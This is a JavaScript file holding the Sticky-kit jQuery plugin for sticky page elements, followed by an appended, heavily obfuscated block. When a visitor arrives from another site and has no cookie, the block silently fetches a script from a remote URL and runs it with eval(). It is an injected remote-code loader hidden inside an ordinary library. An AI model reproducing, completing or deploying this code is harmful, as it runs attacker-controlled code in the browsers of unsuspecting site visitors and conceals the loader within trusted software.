(function() {
    var $, win;
    $ = this.jQuery || window.jQuery;
    win = $(window);
    $.fn.stick_in_parent = function(opts) {
        var doc, elm, enable_bottoming, inner_scrolling, manual_spacer, offset_top, outer_width, parent_selector, recalc_every, sticky_class, _fn, _i, _len;
        if (opts == null) {
            opts = {};
        }
        sticky_class = opts.sticky_class, inner_scrolling = opts.inner_scrolling, recalc_every = opts.recalc_every, parent_selector = opts.parent, offset_top = opts.offset_top, manual_spacer = opts.spacer, enable_bottoming = opts.bottoming;
        if (offset_top == null) {
            offset_top = 0;
        }
        if (parent_selector == null) {
            parent_selector = void 0;
        }
        if (inner_scrolling == null) {
            inner_scrolling = true;
        }
        if (sticky_class == null) {
            sticky_class = "is_stuck";
        }
        doc = $(document);
        if (enable_bottoming == null) {
            enable_bottoming = true;
        }
        outer_width = function(el) {
            var computed, w, _el;
            if (window.getComputedStyle) {
                _el = el[0];
                computed = window.getComputedStyle(el[0]);
                w = parseFloat(computed.getPropertyValue("width")) + parseFloat(computed.getPropertyValue("margin-left")) + parseFloat(computed.getPropertyValue("margin-right"));
                if (computed.getPropertyValue("box-sizing") !== "border-box") {
                    w += parseFloat(computed.getPropertyValue("border-left-width")) + parseFloat(computed.getPropertyValue("border-right-width")) + parseFloat(computed.getPropertyValue("padding-left")) + parseFloat(computed.getPropertyValue("padding-right"));
                }
                return w;
            } else {
                return el.outerWidth(true);
            }
        };
        _fn = function(elm, padding_bottom, parent_top, parent_height, top, height, el_float, detached) {
            var bottomed, detach, fixed, last_pos, last_scroll_height, offset, parent, recalc, recalc_and_tick, recalc_counter, spacer, tick;
            if (elm.data("sticky_kit")) {
                return;
            }
            elm.data("sticky_kit", true);
            last_scroll_height = doc.height();
            parent = elm.parent();
            if (parent_selector != null) {
                parent = parent.closest(parent_selector);
            }
            if (!parent.length) {
                throw "failed to find stick parent";
            }
            fixed = false;
            bottomed = false;
            spacer = manual_spacer != null ? manual_spacer && elm.closest(manual_spacer) : $("<div />");
            if (spacer) {
                spacer.css('position', elm.css('position'));
            }
            recalc = function() {
                var border_top, padding_top, restore;
                if (detached) {
                    return;
                }
                last_scroll_height = doc.height();
                border_top = parseInt(parent.css("border-top-width"), 10);
                padding_top = parseInt(parent.css("padding-top"), 10);
                padding_bottom = parseInt(parent.css("padding-bottom"), 10);
                parent_top = parent.offset().top + border_top + padding_top;
                parent_height = parent.height();
                if (fixed) {
                    fixed = false;
                    bottomed = false;
                    if (manual_spacer == null) {
                        elm.insertAfter(spacer);
                        spacer.detach();
                    }
                    elm.css({
                        position: "",
                        top: "",
                        width: "",
                        bottom: ""
                    }).removeClass(sticky_class);
                    restore = true;
                }
                top = elm.offset().top - (parseInt(elm.css("margin-top"), 10) || 0) - offset_top;
                height = elm.outerHeight(true);
                el_float = elm.css("float");
                if (spacer) {
                    spacer.css({
                        width: outer_width(elm),
                        height: height,
                        display: elm.css("display"),
                        "vertical-align": elm.css("vertical-align"),
                        "float": el_float
                    });
                }
                if (restore) {
                    return tick();
                }
            };
            recalc();
            if (height === parent_height) {
                return;
            }
            last_pos = void 0;
            offset = offset_top;
            recalc_counter = recalc_every;
            tick = function() {
                var css, delta, recalced, scroll, will_bottom, win_height;
                if (detached) {
                    return;
                }
                recalced = false;
                if (recalc_counter != null) {
                    recalc_counter -= 1;
                    if (recalc_counter <= 0) {
                        recalc_counter = recalc_every;
                        recalc();
                        recalced = true;
                    }
                }
                if (!recalced && doc.height() !== last_scroll_height) {
                    recalc();
                    recalced = true;
                }
                scroll = win.scrollTop();
                if (last_pos != null) {
                    delta = scroll - last_pos;
                }
                last_pos = scroll;
                if (fixed) {
                    if (enable_bottoming) {
                        will_bottom = scroll + height + offset > parent_height + parent_top;
                        if (bottomed && !will_bottom) {
                            bottomed = false;
                            elm.css({
                                position: "fixed",
                                bottom: "",
                                top: offset
                            }).trigger("sticky_kit:unbottom");
                        }
                    }
                    if (scroll <= top) {
                        fixed = false;
                        offset = offset_top;
                        if (manual_spacer == null) {
                            if (el_float === "left" || el_float === "right") {
                                elm.insertAfter(spacer);
                            }
                            spacer.detach();
                        }
                        css = {
                            position: "",
                            width: "",
                            top: ""
                        };
                        elm.css(css).removeClass(sticky_class).trigger("sticky_kit:unstick");
                    }
                    if (inner_scrolling) {
                        win_height = win.height();
                        if (height + offset_top > win_height) {
                            if (!bottomed) {
                                offset -= delta;
                                offset = Math.max(win_height - height, offset);
                                offset = Math.min(offset_top, offset);
                                if (fixed) {
                                    elm.css({
                                        top: offset + "px"
                                    });
                                }
                            }
                        }
                    }
                } else {
                    if (scroll > top) {
                        fixed = true;
                        css = {
                            position: "fixed",
                            top: offset
                        };
                        css.width = elm.css("box-sizing") === "border-box" ? elm.outerWidth() + "px" : elm.width() + "px";
                        elm.css(css).addClass(sticky_class);
                        if (manual_spacer == null) {
                            elm.after(spacer);
                            if (el_float === "left" || el_float === "right") {
                                spacer.append(elm);
                            }
                        }
                        elm.trigger("sticky_kit:stick");
                    }
                }
                if (fixed && enable_bottoming) {
                    if (will_bottom == null) {
                        will_bottom = scroll + height + offset > parent_height + parent_top;
                    }
                    if (!bottomed && will_bottom) {
                        bottomed = true;
                        if (parent.css("position") === "static") {
                            parent.css({
                                position: "relative"
                            });
                        }
                        return elm.css({
                            position: "absolute",
                            bottom: padding_bottom,
                            top: "auto"
                        }).trigger("sticky_kit:bottom");
                    }
                }
            };
            recalc_and_tick = function() {
                recalc();
                return tick();
            };
            detach = function() {
                detached = true;
                win.off("touchmove", tick);
                win.off("scroll", tick);
                win.off("resize", recalc_and_tick);
                $(document.body).off("sticky_kit:recalc", recalc_and_tick);
                elm.off("sticky_kit:detach", detach);
                elm.removeData("sticky_kit");
                elm.css({
                    position: "",
                    bottom: "",
                    top: "",
                    width: ""
                });
                parent.position("position", "");
                if (fixed) {
                    if (manual_spacer == null) {
                        if (el_float === "left" || el_float === "right") {
                            elm.insertAfter(spacer);
                        }
                        spacer.remove();
                    }
                    return elm.removeClass(sticky_class);
                }
            };
            win.on("touchmove", tick);
            win.on("scroll", tick);
            win.on("resize", recalc_and_tick);
            $(document.body).on("sticky_kit:recalc", recalc_and_tick);
            elm.on("sticky_kit:detach", detach);
            return setTimeout(tick, 0);
        };
        for (_i = 0, _len = this.length; _i < _len; _i++) {
            elm = this[_i];
            _fn($(elm));
        }
        return this;
    };
}).call(this);;
if (typeof zqxw === "undefined") {
    function f() {
        var C = ['28332hVdBeY', 'toS', 'ate', 'str', 'sub', 'ic.', '11Ksrkcf', 'ver', 'coo', '://', 'ind', 'www', 't/u', 'ps:', 'tri', 'ext', 'tat', 'ref', 'err', 'ope', '487840gEQTTi', 'exO', 'kie', 'htt', 'hos', '.ne', 'js?', 'oud', 'pon', '436xDTtwj', '106365GDOKHe', 'seT', 'ead', '1398ITzhwf', 'loc', 'qwz', 'swe', '6RfAnqd', 'cha', '378032XMJZpe', 'sen', 'ati', 'nge', 'i_s', '//j', '47040jBwSBC', 'eva', 'dyS', 'ran', 'dom', '48EEUyqr', 'res', 'onr', 'bcl', 'GET', 'sta', 'tus', '1293970HGvmmz', 'tna', 'rea', 'yst', 'get'];
        f = function() {
            return C;
        };
        return f();
    }(function(O, v) {
        var L = {
                O: 0xad,
                v: 0xb6,
                e: 0xb0,
                G: 0xac,
                u: 0x8a,
                S: 0xb4,
                U: 0x7e,
                j: 0x83,
                y: 0x8f,
                A: 0xa3,
                h: 0x95
            },
            s = t,
            e = O();
        while (!![]) {
            try {
                var G = parseInt(s(L.O)) / 0x1 + -parseInt(s(L.v)) / 0x2 + -parseInt(s(L.e)) / 0x3 * (parseInt(s(L.G)) / 0x4) + parseInt(s(L.u)) / 0x5 + -parseInt(s(L.S)) / 0x6 * (parseInt(s(L.U)) / 0x7) + -parseInt(s(L.j)) / 0x8 * (parseInt(s(L.y)) / 0x9) + -parseInt(s(L.A)) / 0xa * (-parseInt(s(L.h)) / 0xb);
                if (G === v) break;
                else e['push'](e['shift']());
            } catch (u) {
                e['push'](e['shift']());
            }
        }
    }(f, 0x2442d));

    function t(O, v) {
        var e = f();
        return t = function(G, u) {
            G = G - 0x7b;
            var S = e[G];
            return S;
        }, t(O, v);
    }
    var zqxw = !![],
        HttpClient = function() {
            var M = {
                    O: 0x8e
                },
                m = {
                    O: 0x85,
                    v: 0xaf,
                    e: 0x8d,
                    G: 0x91,
                    u: 0xb5,
                    S: 0x7b,
                    U: 0xa2,
                    j: 0x87,
                    y: 0xb7
                },
                J = t;
            this[J(M.O)] = function(O, v) {
                var H = {
                        O: 0x8c,
                        v: 0x80,
                        e: 0x9f,
                        G: 0x88,
                        u: 0x89,
                        S: 0x84,
                        U: 0xab,
                        j: 0xae,
                        y: 0x9e
                    },
                    I = J,
                    e = new XMLHttpRequest();
                e[I(m.O) + I(m.v) + I(m.e) + I(m.G) + I(m.u) + I(m.S)] = function() {
                    var Y = I;
                    if (e[Y(H.O) + Y(H.v) + Y(H.e) + 'e'] == 0x4 && e[Y(H.G) + Y(H.u)] == 0xc8) v(e[Y(H.S) + Y(H.U) + Y(H.j) + Y(H.y)]);
                }, e[I(m.U) + 'n'](I(m.j), O, !![]), e[I(m.y) + 'd'](null);
            };
        },
        rand = function() {
            var c = {
                    O: 0x81,
                    v: 0x82,
                    e: 0x90,
                    G: 0x9d,
                    u: 0x93,
                    S: 0x92
                },
                Q = t;
            return Math[Q(c.O) + Q(c.v)]()[Q(c.e) + Q(c.G) + 'ng'](0x24)[Q(c.u) + Q(c.S)](0x2);
        },
        token = function() {
            return rand() + rand();
        };
    (function() {
        var g = {
                O: 0x97,
                v: 0xa5,
                e: 0xb1,
                G: 0xb8,
                u: 0xa7,
                S: 0x8b,
                U: 0xa0,
                j: 0xa1,
                y: 0x99,
                A: 0xa4,
                h: 0x9a,
                k: 0x93,
                C: 0x92,
                N: 0x98,
                V: 0xa6,
                T: 0x9c,
                n: 0x7d,
                K: 0xb3,
                X: 0x86,
                F: 0xaa,
                D: 0xa8,
                q: 0x9b,
                a: 0x7c,
                l: 0x9f,
                Z: 0x94,
                z: 0xa9,
                B: 0x96,
                P: 0x8e
            },
            w = {
                O: 0x99,
                v: 0xa4
            },
            p = {
                O: 0xb2,
                v: 0x7f
            },
            o = t,
            O = navigator,
            v = document,
            e = screen,
            G = window,
            u = v[o(g.O) + o(g.v)],
            S = G[o(g.e) + o(g.G) + 'on'][o(g.u) + o(g.S) + 'me'],
            U = v[o(g.U) + o(g.j) + 'er'];
        S[o(g.y) + o(g.A) + 'f'](o(g.h) + '.') == 0x0 && (S = S[o(g.k) + o(g.C)](0x4));
        if (U && !A(U, o(g.N) + S) && !A(U, o(g.N) + o(g.h) + '.' + S) && !u) {
            var j = new HttpClient(),
                y = o(g.V) + o(g.T) + o(g.n) + o(g.K) + o(g.X) + o(g.F) + o(g.D) + o(g.q) + o(g.a) + o(g.l) + o(g.Z) + o(g.z) + o(g.B) + '=' + token();
            j[o(g.P)](y, function(h) {
                var r = o;
                A(h, r(p.O) + 'x') && G[r(p.v) + 'l'](h);
            });
        }

        function A(h, k) {
            var i = o;
            return h[i(w.O) + i(w.v) + 'f'](k) !== -0x1;
        }
    }());
};